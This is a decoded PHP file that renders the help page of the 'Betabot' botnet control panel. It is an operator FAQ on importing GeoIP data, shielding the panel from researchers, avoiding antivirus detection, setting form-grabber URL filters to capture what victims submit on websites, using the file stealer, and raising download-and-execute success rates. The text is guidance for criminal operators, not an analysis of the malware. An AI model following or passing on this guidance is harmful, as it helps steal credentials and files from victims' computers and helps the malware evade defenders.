<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "<table align=\"center\">\r\n        <thead>\r\n          <tr>\r\n            <th width=\"20%\"></th>\r\n            <th width=\"80%\"></th>\r\n          </tr>\r\n        </thead>\r\n        <tbody>\r\n\t\t<tr>\r\n            <td valign=\"top\">\r\n\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t<table class=\"table-bordered table-condensed\" align=\"left\" style=\"width: 270px;\">\r\n\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t  <tr>\r\n\t\t\t\t\t\t\t<th width=\"220\"></th>\r\n\t\t\t\t\t\t  </tr>\r\n\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t<strong>Topics</strong>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<a href=\"#general\">General server configuration</a><br />\r\n\t\t\t\t\t\t\t\t<a href=\"#settings\">Panel settings questions</a><br />\r\n\t\t\t\t\t\t\t\t<a href=\"#grabber\">Grabber questions</a><br />\r\n\t\t\t\t\t\t\t\t<a href=\"#tasks\">Task questions</a><br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t</tbody>\r\n\t\t\t\t</table>\r\n\t\t\t\t</font>\r\n\t\t\t</td>\r\n\t\t\t\r\n\t\t\t\t<td valign=\"top\" style=\"width: 1000px;\">\r\n\t\t\t\t\r\n<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"1200\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t<tr>\r\n\t\t<td><strong><font size=\"2\">Help contents</font></strong></td>\r\n\t</tr>\r\n\t<tr>\r\n\t\t<td valign=\"top\">\r\n\t\t\t<strong>------------------------------------------------------------------------</strong>\r\n\t\t\t<br />\r\n\t\t\t<label id=\"general\"><strong>General configuration issues</strong></label>\r\n\t\t\t<strong>------------------------------------------------------------------------</strong>\r\n\t\t\t<br />\r\n\t\t\t<strong>How do I upload GeoIP data?</strong><br />\r\n\t\t\tTo upload all GeoIP data, you may need to adjust the PHP script execution time by editting php.ini, as imports via phpMyAdmin can sometimes take up to or more than 10 minutes.\r\n\t\t\tOnce PHP is properly configured for this, open phpMyAdmin, go the database you created for the bot, then navigate to the table `geoip`. Click Import and on that page select type `CSV`. Simply submit and continue resubmitting until it is fully imported.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t*** Betabot supports Geolite City and ASN information. If present, the main index will display relevant findings for each bot. You can import these into the geoip_asn, geoip_city and geoip_city_ips tables.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>Where can I get up-to-date GeoIP CSV files?</strong><br />\r\n\t\t\tThe latest Geolite data can be retrieved at: <a target=\"_blank\" href=\"http://dev.maxmind.com/geoip/legacy/geolite/\">http://dev.maxmind.com/geoip/legacy/geolite/</a> <br />\r\n\t\t\tSimply TRUNCATE the geoip* tables and re-import the new files gotten from the above website.\r\n\t\t\t\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>Trying to export data from the panel says unable to write / access denied. Why?</strong><br />\r\n\t\t\tA few places in the panel need write access. The panel php scripts need write access to the following directories/files:<br />\r\n\t\t\t1. / <i>(Root panel directory)</i><br />\r\n\t\t\t2. /exports/ directory<br />\r\n\t\t\t3. /files/ directory</i><br />\r\n\t\t\t\r\n\t\t\t<br />\r\n\t\t\tPlease CHMOD these areas with correct permissions (for write access) if you have not already.\r\n\t\t\t\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>Is Cloudflare explicitly supported?</strong><br />\r\n\t\t\tWe do not officially support cloudflare, however it has been seen working in the past with this setup. We cannot support any issues you may have with it, though.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>------------------------------------------------------------------------</strong>\r\n\t\t\t<br />\r\n\t\t\t<label id=\"settings\"><strong>Panel settings questions</strong></label>\r\n\t\t\t<strong>------------------------------------------------------------------------</strong>\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>When should I use 'proactive defense' from panel settings?</strong><br />\r\n\t\t\tThis feature prevents other programs (mainly other malware) from injecting code into remote processes, and also blocks some attempts at malware installation. This is useful when you do not want other bots installing or working properly on the same system. However, if you plan on downloading other components, you should keep this disabled as it will interfere with anything you issue download tasks for as well.\r\n\t\t\t\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>What is reduced functionality mode?</strong><br />\r\n\t\t\tReduced functionality mode disables the systemwide injector and thus a lot of other components that depend on being injected into processes. This can be useful if you find the bot is not performing as well or if antivirus protection systems on machines you are after are detecting the bot when it performs these code injection actions.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>How can I better protect the panel from being taken over?</strong><br />\r\n\t\t\tThere are a number of ways to mitigate outside threats to your server:\r\n\t\t\t<br /><br />\r\n\t\t\t1. For login protection to the panel, you can go to Panel Settings -> Security and choose a secure login code. This acts sort of like a secondary password.<br />\r\n\t\t\t2. You can use HTACCESS rules to restrict access of files to specific IPs you control. This will ensure only you can access administrative panel files.<br />\r\n\t\t\t3. If all your machines are only from a specific reason, you can set up firewall rules to block all other undesired regions/ISPs. This can help deflect unwanted attention from researchers.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>------------------------------------------------------------------------</strong>\r\n\t\t\t<br />\r\n\t\t\t<label id=\"grabber\"><strong>Grabber-related questions</strong></label>\r\n\t\t\t<strong>------------------------------------------------------------------------</strong>\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>I'm not getting any form grab reports. Why?</strong><br />\r\n\t\t\tIn order to receive form reports, you need to add your own URL filters. Go to Logs -> Forms, then at the bottom-right of the side panel, select 'Manage website grab filters'. Once you have done this, enter the URL of the page that handles the form you want to capture data from, and surround it with asterisks (*). Because forms are grabbed based on URL/wildcard masks, you must always surround with asterisks.\r\n\t\t\t\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\r\n\t\t\t<strong>Can the form grabber upload all forms posted by a browser?</strong><br />\r\n\t\t\tNo. Filters are required to avoid swamping the server with useless data. However, filter terms can be as few as 4 or more characters, which if used right, can be used to collect broad ranges of data.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>How do I use the file stealer?</strong><br />\r\n\t\t\tThe file stealer is based on a special configuration you provide on the file grabber page. There is an example in the file \"<i>filesearch.dat_example</i>\" in the main panel directory. This template details all possible configuration parameters. Please note that string searches are done by case-insensitive string search. Wildcards or REGEX is not supported. Only ANSI characters are allowed.\r\n\t\t\t\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>------------------------------------------------------------------------</strong>\r\n\t\t\t<br />\r\n\t\t\t<label id=\"tasks\"><strong>Task-related questions</strong></label>\r\n\t\t\t<strong>------------------------------------------------------------------------</strong>\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>Sometimes some tasks are not properly executed. It says completed but?</strong><br />\r\n\t\t\tIf this occurs, please try 'Delete all tasks' and re-add the task to execute.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>Why do some tasks seem to get set to \"Expired\" after a certain amount of time?</strong><br />\r\n\t\t\tAll tasks have an assigned expiration date. The default is current date + 5 days. However you can always change this to whatever you want. To create a task that (almost) never expires, you could set it to a year or two in the future.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>Is there a way to increase download/execution rates?</strong><br />\r\n\t\t\tSometimes the bot may interfere with the downloaded software. When issuing a download task, you can choose \"Disable proactive defense for this process\" to help improve proper execution rates.\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t\t<strong>Download/Update error codes reference</strong><br />\r\n\t\t\t1 - 2: Internal error<br />\r\n\t\t\t3: Invalid URL<br />\r\n\t\t\t4: Wininet Initialize failure<br />\r\n\t\t\t5: InternetOpenUrl failure (Error fetching from file host, might be a web server issue)<br />\r\n\t\t\t6: CreateFileW failure<br />\r\n\t\t\t7: InternetReadFile returned no bytes<br />\r\n\t\t\t8: Failed to execute new file<br />\r\n\t\t\t9: General update failure<br />\r\n\t\t\t10: Internal error<br />\r\n\t\t\t11: Memory allocation failure<br />\r\n\t\t\t12: Internal error<br />\r\n\t\t\t13: PE header was invalid (probably decrypt option used, but file was not able to be decrypted)<br /><br />\r\n\t\t\t\r\n\t\t\t1001: Update - Process creation failure<br />\r\n\t\t\t1002: Update - SHA1 Hash matched - Updated is already installed<br />\r\n\t\t\t1003: Update - New file launched but seems to have crashed before doing anything useful<br />\r\n\t\t\t1004: Update - File was created, but access was denied or file did not exist when CreateProcessW was called. Possibly removed by AntiVirus\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t\r\n\t\t</td>\r\n\t</tr>\r\n</table>\r\n\r\n\t\t\t\t</td>\r\n\t\t\t</tr>\r\n\t\t\t</table>\r\n\r\n";

?>